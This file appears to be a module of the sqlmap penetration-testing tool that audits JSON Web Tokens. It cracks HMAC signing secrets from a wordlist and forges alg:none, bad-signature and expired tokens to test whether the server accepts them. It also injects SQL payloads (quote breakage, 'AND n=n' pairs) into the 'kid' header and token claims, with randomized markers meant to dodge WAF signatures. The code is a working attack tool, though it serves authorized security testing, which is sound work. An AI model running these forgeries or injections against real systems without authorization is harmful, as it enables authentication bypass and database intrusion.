#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import time

from lib.core.common import beep
from lib.core.common import randomStr
from lib.core.convert import getUnicode
from lib.core.data import conf
from lib.core.data import logger
from lib.core.data import paths
from lib.core.enums import CUSTOM_LOGGING
from lib.core.enums import PLACE
from lib.core.settings import JWT_COMMON_SECRETS
from lib.core.settings import JWT_MAX_CRACK_WORDS
from lib.core.settings import UPPER_RATIO_BOUND
from lib.core.wordlist import Wordlist
from lib.request.connect import Connect as Request
from lib.utils.jwt import auditJWT
from lib.utils.jwt import crackHMAC
from lib.utils.jwt import encodeSegment
from lib.utils.jwt import forgeJWT
from lib.utils.jwt import findJWTs
from lib.utils.jwt import HMAC_ALGORITHMS
from lib.utils.jwt import parseJWT
from lib.utils.nonsql import EXTRACT_MATCH_MARGIN
from lib.utils.nonsql import leansTrue
from lib.utils.nonsql import ratio
from lib.utils.nonsql import sqlErrorPresent
from thirdparty import six

# improbable literal used to build tamper values / reject calibration; randomized per run so it never
# becomes a static signature a WAF can pin
JWT_SENTINEL = randomStr(length=12, lowercase=True)

# severity -> sort rank (most severe first) for a tidy final report
_SEVERITY_RANK = {"critical": 0, "high": 1, "medium": 2, "info": 3}

# internal marker for "the token rides in an arbitrary HTTP header" (no matching PLACE constant; headers
# are carried by conf.httpHeaders and rebuilt via auxHeaders)
_HEADER_PLACE = "HEADER"

# registered temporal claims are validated as timestamps, never concatenated into SQL - skip them when
# probing for injection (saves requests and trims the false-positive surface)
_SKIP_CLAIMS = frozenset(("exp", "nbf", "iat"))

# upper bound on the number of claims actively probed, so a hostile/huge token cannot explode the request count
_MAX_PROBE_CLAIMS = 20

# resolved location of the token in the outgoing request (set by _locate)
_TOKEN = None
_PLACE = None
_HEADER = None            # header name when the token rides in an HTTP header
_HEADER_VALUE = None      # that header's original value (to rebuild it with a forged token)

def _locate():
    """Find the first JSON Web Token carried by the request (parameters first, then HTTP headers) and
    record where it lives so probes can rebuild that one component with a forged token."""

    global _TOKEN, _PLACE, _HEADER, _HEADER_VALUE

    for place in (PLACE.GET, PLACE.POST, PLACE.CUSTOM_POST, PLACE.COOKIE):
        blob = (conf.parameters or {}).get(place)
        tokens = findJWTs(blob) if blob else []
        if tokens:
            _TOKEN, _PLACE, _HEADER, _HEADER_VALUE = tokens[0], place, None, None
            return True

    for name, value in (conf.httpHeaders or []):
        tokens = findJWTs(value)
        if tokens:
            _TOKEN, _PLACE, _HEADER, _HEADER_VALUE = tokens[0], _HEADER_PLACE, name, value
            return True

    return False

def _send(token):
    """Issue one request with the located token replaced by 'token', returning the response body (or None
    on a transport failure/block, which must never enter the oracle as an empty string)."""

    skipUrlEncode = conf.skipUrlEncode
    conf.skipUrlEncode = True

    if conf.delay:
        time.sleep(conf.delay)

    try:
        kwargs = {"raise404": False, "silent": True}

        if _PLACE == _HEADER_PLACE:
            kwargs["auxHeaders"] = {_HEADER: _HEADER_VALUE.replace(_TOKEN, token)}
            payload = kwargs["auxHeaders"][_HEADER]
        else:
            payload = (conf.parameters[_PLACE]).replace(_TOKEN, token)
            if _PLACE == PLACE.GET:
                kwargs["get"] = payload
            elif _PLACE in (PLACE.POST, PLACE.CUSTOM_POST):
                kwargs["post"] = payload
            elif _PLACE == PLACE.COOKIE:
                kwargs["cookie"] = payload

        logger.log(CUSTOM_LOGGING.PAYLOAD, payload)
        page = Request.getPage(**kwargs)[0]
    except Exception as ex:
        logger.debug("JWT probe request failed: %s" % getUnicode(ex))
        return None
    finally:
        conf.skipUrlEncode = skipUrlEncode

    return page

def _wordlistSecrets():
    """Yield candidate HMAC secrets for the offline crack: the small common set first (fast wins), then
    the shipped wordlist streamed lazily, bounded by JWT_MAX_CRACK_WORDS."""

    for secret in JWT_COMMON_SECRETS:
        yield secret

    count = 0
    try:
        for word in Wordlist([paths.WORDLIST]):
            yield getUnicode(word)
            count += 1
            if count >= JWT_MAX_CRACK_WORDS:
                break
    except Exception as ex:
        logger.debug("JWT wordlist streaming stopped: %s" % getUnicode(ex))

def _crackSecret(data):
    """Recover an HS* signing secret from the shipped dictionary (a full forgery primitive), else None."""

    return crackHMAC(data["raw"], _wordlistSecrets(), limit=JWT_MAX_CRACK_WORDS + len(JWT_COMMON_SECRETS))

def _corruptSignature(token):
    """Same header and claims, deliberately wrong signature - accepted like the original means the server
    does not verify the signature at all."""

    header, payload, signature = token.split('.')
    flipped = (signature[:-1] + ("A" if not signature.endswith("A") else "B")) if signature else "AAAA"
    return "%s.%s.%s" % (header, payload, flipped)

def _makeOracle():
    """Calibrate an acceptance oracle from the original (authenticated) response vs a structurally-broken
    token (rejected by any consumer). Returns accepted(page)->bool, or None when the authenticated page is
    too dynamic to use, or the endpoint does not distinguish a valid token from a broken one.

    A forgery is 'accepted' when its response leans to the authenticated model over the rejected one (shared
    tri-state margin logic - tolerates the baseline's natural jitter, e.g. a rotating CSRF token/timestamp,
    which a hard identical-page gate would misread as a rejection)."""

    baseline = _send(_TOKEN)
    baseline2 = _send(_TOKEN)
    reject = _send("%s.%s.%s" % (JWT_SENTINEL, JWT_SENTINEL, JWT_SENTINEL))

    if None in (baseline, baseline2, reject):
        return None
    if ratio(baseline, baseline2) < UPPER_RATIO_BOUND:
        return None                                    # authenticated page too dynamic to be a reliable oracle
    if ratio(baseline, reject) >= UPPER_RATIO_BOUND:
        return None                                    # endpoint can't tell a valid token from a broken one

    return lambda page: page is not None and leansTrue(page, baseline, reject)

def _errorBased(mutate, breaker):
    """A SQL error must surface with the syntax-breaking payload but NOT with the neutral control - so a page
    that merely contains SQL-error text (a doc/debug banner) cannot masquerade as an injection."""

    control = _send(mutate(JWT_SENTINEL))
    broken = _send(mutate(breaker))
    return control is not None and broken is not None and sqlErrorPresent(broken) and not sqlErrorPresent(control)

def _booleanConfirmed(mutate, ref, good, bad):
    """Confirmed boolean divergence with jitter guards: the endpoint must be stable for the neutral 'ref' (a
    re-fetch matches), the syntactically-valid 'good' mutation must match that control while the query-breaking
    'bad' mutation diverges - and the divergence must reproduce on a re-send (so a one-off dynamic response is
    not read as a vulnerability)."""

    base = _send(mutate(ref))
    base2 = _send(mutate(ref))
    if None in (base, base2):
        return False

    # the page's natural noise floor: two identical neutral requests. If even that is below the similarity
    # bound the page is too dynamic to judge; otherwise the 'bad' mutation only counts as a real divergence
    # when it drops the similarity MEANINGFULLY BELOW that floor (more than mere per-request jitter)
    jitter = ratio(base, base2)
    if jitter < UPPER_RATIO_BOUND:
        return False
    threshold = jitter - EXTRACT_MATCH_MARGIN

    goodPage = _send(mutate(good))
    badPage = _send(mutate(bad))
    badPage2 = _send(mutate(bad))
    if None in (goodPage, badPage, badPage2):
        return False

    return (ratio(base, goodPage) >= threshold
            and ratio(base, badPage) <= threshold
            and ratio(base, badPage2) <= threshold)

def _probeStringInjection(mutate):
    """SQL-injection probe for a string component (kid or a string claim) via single-quote breakage: a lone
    quote breaks the query while the balanced pair restores it."""

    s = JWT_SENTINEL
    if _errorBased(mutate, "%s'%s" % (s, s)):
        return ("error-based SQL injection", "critical")
    if _booleanConfirmed(mutate, s, "%s''%s" % (s, s), "%s'%s" % (s, s)):
        return ("boolean-based SQL injection", "high")
    return None

def _probeNumericInjection(mutate, value):
    """SQL-injection probe for a numeric claim: a quote still errors a string-concatenated number, and an
    'AND n=n' / 'AND n=n+1' pair distinguishes a true from a false condition in a numeric (unquoted) context."""

    n = 1000 + len(JWT_SENTINEL)
    if _errorBased(mutate, "%s'" % value):
        return ("error-based SQL injection", "critical")
    if _booleanConfirmed(mutate, str(value), "%s AND %d=%d" % (value, n, n), "%s AND %d=%d" % (value, n, n + 1)):
        return ("boolean-based SQL injection", "high")
    return None

def jwtScan():
    """Audit the JSON Web Token carried by the request: report offline weaknesses (alg:none, guessable
    HMAC secret, unsafe key headers, missing expiry), confirm which forgeries the server actually accepts
    (signature-not-verified / alg:none / expired), and probe the 'kid' header and claims for SQL injection.
    Self-contained - SQL enumeration switches (--banner/--dbs/--tables/...) do not apply."""

    if not _locate():
        logger.warning("no JSON Web Token found in the request (looked in GET/POST/cookie parameters and HTTP headers)")
        return

    data = parseJWT(_TOKEN)
    header = data["header"]
    payload = data["payload"]
    where = ("'%s' header" % _HEADER) if _PLACE == _HEADER_PLACE else ("%s parameter" % _PLACE)
    logger.info("found a JSON Web Token in the %s (algorithm '%s')" % (where, header.get("alg")))

    findings = []      # (id, severity, summary, detail, confirmed)

    # offline findings that are inherently speculative (not proven by reading the token or an active probe):
    # an asymmetric alg is only a confusion CANDIDATE, and a bare 'kid' is only a candidate injection point
    OFFLINE_CANDIDATES = ("alg-confusion", "kid-injection")

    # 1. offline heuristic battery (structural), then a single wordlist pass for the HMAC secret
    for fid, severity, summary, detail in auditJWT(_TOKEN):
        findings.append((fid, severity, summary, detail, fid not in OFFLINE_CANDIDATES))

    secret = None
    if (header.get("alg") or "").upper() in HMAC_ALGORITHMS:
        logger.info("attempting to recover the HMAC signing secret from the wordlist")
        secret = _crackSecret(data)
        if secret is not None:
            findings.append(("weak-hmac-secret", "critical", "HMAC secret recovered ('%s')" % secret, "arbitrary tokens can be forged and re-signed", True))

    algNoneAccepted = False

    # 2. active oracle: which forgeries does the server actually accept?
    oracle = _makeOracle()
    if oracle is None:
        logger.warning("the endpoint does not distinguish a valid token from a broken one - cannot actively confirm forgeries (offline findings still apply)")
    else:
        # signature not verified: same claims, wrong signature (skip when the token is already unsigned - the
        # 'alg:none' finding below covers that, and signing an unsigned token proves nothing)
        if (header.get("alg") or "").lower() != "none" and data["signature"] and oracle(_send(_corruptSignature(_TOKEN))):
            findings.append(("signature-not-verified", "critical", "server accepts a token with an invalid signature", "any claim can be forged without a key", True))

        # alg:none accepted: strip the signature entirely, keep the claims
        try:
            noneToken = forgeJWT(dict(header, alg="none"), payload)
            if oracle(_send(noneToken)):
                algNoneAccepted = True
                findings.append(("alg-none-accepted", "critical", "server accepts an unsigned ('alg':'none') token", "any claim can be forged without a key", True))
        except ValueError:
            pass

        # expired token accepted: only meaningful once we can re-sign (cracked secret or alg:none)
        if isinstance(payload, dict) and "exp" in payload and (secret or algNoneAccepted):
            forged = dict(payload, exp=1)     # 1970 - unmistakably expired
            expToken = forgeJWT(header, forged, key=secret) if secret else forgeJWT(dict(header, alg="none"), forged)
            if oracle(_send(expToken)):
                findings.append(("expired-accepted", "high", "server accepts an expired token", "expiry ('exp') is not enforced - stolen tokens never lapse", True))

    # a re-signing primitive (recovered secret, else an accepted alg:none) keeps a tampered token valid so
    # its mutated component actually reaches the back-end
    if secret:
        signer = lambda hdr, pl: forgeJWT(hdr, pl, key=secret)
    elif algNoneAccepted:
        signer = lambda hdr, pl: forgeJWT(dict(hdr, alg="none"), pl)
    else:
        signer = None

    # 3. 'kid' header injection: with a primitive, tamper 'kid' in a validly (re)signed token; without one,
    # keep the original signature (this only reaches the sink when 'kid' is resolved before verification)
    if "kid" in header:
        kidMutate = (lambda value: signer(dict(header, kid=value), payload)) if signer else (lambda value: _reheader(_TOKEN, "kid", value))
        result = _probeStringInjection(kidMutate)
        if result:
            findings.append(("kid-injection-confirmed", result[1], "'kid' header is vulnerable to %s" % result[0], "the key identifier reaches a back-end query", True))

    # 4. claim injection (needs a re-signing primitive so the tampered token is accepted and reaches the sink);
    # string claims are probed with quote breakage, numeric claims in an unquoted 'AND n=n' context
    if isinstance(payload, dict) and signer:
        probed = 0
        for name in list(payload):
            if probed >= _MAX_PROBE_CLAIMS:
                break
            value = payload[name]
            mutate = lambda newValue, name=name: signer(header, dict(payload, **{name: newValue}))
            if name in _SKIP_CLAIMS or isinstance(value, bool):    # temporal claim, or bool (int subclass, never a value context)
                continue
            elif isinstance(value, six.string_types):
                result = _probeStringInjection(mutate)
            elif isinstance(value, (int, float)):
                result = _probeNumericInjection(mutate, value)
            else:
                continue
            probed += 1
            if result:
                findings.append(("claim-injection-confirmed", result[1], "claim '%s' is vulnerable to %s" % (name, result[0]), "the claim value reaches a back-end query", True))

    _report(_dedupe(findings))

    return findings

def _reheader(token, field, value):
    """Rebuild 'token' with header field set to 'value', keeping the original claims and signature (used to
    probe a header, e.g. 'kid', that the server resolves before checking the signature)."""

    _, claims, signature = token.split('.')
    return "%s.%s.%s" % (encodeSegment(dict(parseJWT(token)["header"], **{field: value})), claims, signature)

def _dedupe(findings):
    """Drop the speculative 'kid-injection' candidate once the active probe has confirmed 'kid' SQL injection,
    so the same header is not reported twice (once as candidate, once as confirmed)."""

    if any(_[0] == "kid-injection-confirmed" for _ in findings):
        findings = [_ for _ in findings if _[0] != "kid-injection"]
    return findings

def _report(findings):
    """Emit findings most-severe first, then a one-line self-contained note. Info-severity findings are logged
    at INFO (a bare 'kid' / asymmetric-alg candidate is not a warning); actual weaknesses at WARNING."""

    if not findings:
        logger.info("no JWT weaknesses found")
        return

    for fid, severity, summary, detail, confirmed in sorted(findings, key=lambda _: _SEVERITY_RANK.get(_[1], 9)):
        marker = "confirmed" if confirmed else "candidate"
        message = "JWT %s [%s]: %s (%s)" % (marker, severity, summary, detail)
        (logger.info if severity == "info" else logger.warning)(message)

    if conf.beep:
        beep()

    logger.info("JWT audit is self-contained; SQL enumeration switches (e.g. --banner, --dbs, --tables) do not apply here")
